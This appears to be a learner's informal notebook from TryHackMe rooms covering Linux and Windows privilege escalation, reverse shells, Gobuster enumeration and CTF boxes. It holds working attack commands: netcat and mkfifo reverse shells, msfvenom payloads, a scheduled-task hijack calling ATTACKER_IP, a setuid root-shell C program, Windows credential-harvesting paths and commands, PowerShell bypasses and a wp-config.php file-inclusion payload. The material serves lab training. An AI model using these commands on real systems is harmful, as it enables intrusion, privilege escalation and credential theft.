# R

* Remember for web/general/security
* .todo: dns discord
* web general | terminology | URL may have to be moved

<hr>

## Notes

* CTF =  capture the flag

<hr>

## Prev esc

https://tryhackme.com/room/linprivesc
=> hint/notes
=> network

* https://tryhackme.com/room/introtoshells
* If there are tools not installed on your target: https://github.com/andrew-d/static-binaries
* nc ip port -e /bin/bash (rev shell)
* nc -lvnp port -e /bin/bash (bind shell)
* this is not included in most versions of netcat
* `mkfifo /tmp/f; nc XXX < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f` (listener for our wxw shell)
* https://tryhackme.com/room/introtoshells (Windows)
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-traditional
* `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`
* staged reverse shell payloads and stageless
* exploit/multi/handler
  * It's essential if you want to use Meterpreter shells, and is the go-to when using staged payloads
  * `set PAYLOAD X`
  * `exploit -j`
* socat is a sort of ncat+more, but not installed by default, and harder to learn.
  * Read again the section: https://tryhackme.com/room/introtoshells
  * Can encrypt, may bypass an IDS: https://tryhackme.com/room/introtoshells
* Socat: transfer the socat binary
* Reverse shells/... note lasty

https://tryhackme.com/room/linprivesc
=> capabilities
=> `getcap -r / 2>/dev/null`
=> gtfobins
* https://www.revshells.com/ (sh => bash)
* if no_root_squash present
* Another alternative to this program, is to create a suite file with a copy of bash.

```c
int main() {
  setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
```

* https://tryhackme.com/room/windowsprivesc20

```
Misconfigurations on Windows services or scheduled tasks
Excessive privileges assigned to our account
Vulnerable software
Missing Windows security patches
```

* System are more perms that admin
* Windows Deployment Services: deploy an image to serveral hosts. These are refereed as Unattended, Admin account required to create them. Credentials

```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

* PowerShell's history: `type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` and in a cmd `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
* List saved crendetials `cmdkey /list`. Run command as another user? `runas /savecred /user:admin cmd.exe`
* Internet Information Services (IIS) is the default web server on Windows installations.

```
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

* PuTTY `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`
* `schtasks /query /tn vulntask /fo list /v`: look for ones in which we can inject/modify the binary
* Start task manually `schtasks /run /tn vulntask` (CTF)
* `icacls c:\tasks\schtask.bat`: check permissions (F=Full Access)
* (cmd) `echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > task.bat`
* Windows installer files (-f msi -o malicious.msi)
* Windows services are managed by the Service Control Manager (SCM).
* `sc qc` (ahah, my steel moutain)
* IN A EFFING CMD BITCH

<hr>

## Forced Browsing

* https://tryhackme.com/room/webenumerationv2
  * Gobuster options.
  * -k for ssl errors
* Gobuster DNS/VHosts
* Useful wordlists
* nmap `-n` redo
* add a warning + 64th
* `cat /usr/share/wordlists/dirb/extensions_common.txt | tr '\n' ','`
* `gobuster -u` for vhost
* `gobuster vhost -u http://webenum.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t50 --append-domain` (in new versions of gobuster, false by default)
* NOT FINISHED https://tryhackme.com/room/webenumerationv2

> While participating in rooms on TryHackMe, virtual hosts would be a good way to hide a completely different website if nothing turned up on your main port 80/443 scan.

<hr>

## Overconfidence

--- https://tryhackme.com/room/steelmountain

* use meterpreter upload to upload the winPEAS
* `upload /tmp/xxx`
* `shell`
* `.\winPEASany_ofs.exe`
* `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"`
* `powershell -ep bypass -c ". .\PowerUp.ps1;"`
* `https://github.com/itm4n/PrivescCheck#metasploit-timeout`
* `load powershell`
* `powershell_shell`
* `. .\PowerUp.ps1; Invoke-AllChecks`
* `. .\PowerUp.ps1` `PS > Invoke-AllChecks`
* https://www.joesandbox.com/#windows
* https://github.com/EgeBalci/sgn
* sc qc XXX
* sc stop XXX
* `Write-ServiceBinary -Name 'XXX' -Path ".\nc.exe"`
* sc start XXX
* `powershell -c wget "URL" -outfile "OUTPUT"`
* like OTX: https://cyware.com/

--- https://tryhackme.com/room/allinonemj

* Kali right-arrow
* Test: `wpscan --url http://10.10.162.222/wordpress/ --detection-mode aggressive`
* `php://filter/convert.base64-encode/resource=../../../../../wp-config.php` (file inclusion)
* not finished aza.